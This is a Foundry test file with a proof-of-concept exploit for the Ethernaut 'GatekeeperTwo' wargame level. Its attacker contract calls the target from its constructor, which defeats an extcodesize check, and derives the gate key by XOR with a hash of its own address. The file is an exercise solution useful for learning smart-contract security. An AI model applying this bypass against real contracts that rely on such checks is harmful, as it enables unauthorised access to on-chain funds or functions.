// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level14.sol";

contract POC is Test {
    GatekeeperTwo level14;

    function setUp() public {
        level14 = new GatekeeperTwo();
    }

    function test() public {
        new GatekeeperTwoAttacker(level14);
    }
}

// 0x999d3ec583cbb470
contract GatekeeperTwoAttacker {
    /**
    Constructor:
    https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/

    bytes8 _gateKey;

    a = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
    b = uint64(_gateKey);
    result = uint64(0) - 1;

    a ^ b = result;
    result ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
     */
    constructor(GatekeeperTwo gatekeeper) public payable {
        uint64 result = uint64(0) - 1;
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = result ^ a;
        bytes8 gateKey = bytes8(key);

        require(a ^ uint64(gateKey) == result);
        gatekeeper.enter(gateKey);
    }
}
